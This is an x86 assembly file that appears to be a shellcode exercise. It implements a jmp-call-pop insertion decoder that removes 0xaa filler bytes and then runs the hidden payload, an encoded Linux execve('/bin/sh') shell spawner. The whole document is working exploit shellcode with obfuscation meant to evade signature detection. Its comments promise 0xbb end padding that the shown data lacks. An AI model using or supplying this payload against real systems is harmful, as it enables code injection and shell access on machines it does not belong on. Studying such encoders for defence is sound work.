global _start

section .text
_start:
    jmp short call_shellcode
    
decoder:

    ; esi holds the start of EncodedShellCode
    ; edi is going to perform normal indexing into EncodedShellCode
        ; that is why it is incremented by 0x01
    ; [esi + eax] is designed to point to next 0xaa byte
        ; So before copying we check if it actually is 0xaa
        ; If it is not 0xaa, we assume that decoding is finished and jump
        ; It is possible that program also inserts some 0xaa at the end of EncodedShellCode
        ; This can mess things up and we can continue decoding memory locations next to shell code
            ; To prevent this, we add padding of 0xbb two times and ensure that it will fail xor check
            ; We add two because last byte of encoded shell code can be data as well as 0xaa.

    pop esi
    lea edi, [esi + 0x1]
    xor eax, eax
    mov al, 0x01
    xor ebx, ebx


decode:
    ; Check if the byte pointed to by [esi + eax] is 0xaa
    mov bl, byte [esi + eax]
    xor bl, 0xaa

    ; Otherwise jump to shell code
    jnz short EncodedShellCode

    ; If not rewrite the [edi] with [esi + eax + 1]
    mov bl, byte [esi + eax + 0x1]
    mov byte [edi], bl

    ; Increment edi
    inc edi
    ; Make [esi + eax] point to next 0xaa
    add al, 0x2

    ; Jump
    jmp short decode


call_shellcode:
    call decoder
    EncodedShellCode: db 0xeb,0xaa,0x10,0xaa,0x5b,0xaa,0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb8,0xaa,0x0b,0xaa,0x00,0xaa,0x00,0xaa,0x00,0xaa,0xcd,0xaa,0x80,0xaa,0xe8,0xaa,0xeb,0xaa,0xff,0xaa,0xff,0xaa,0xff,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x73,0xaa,0x68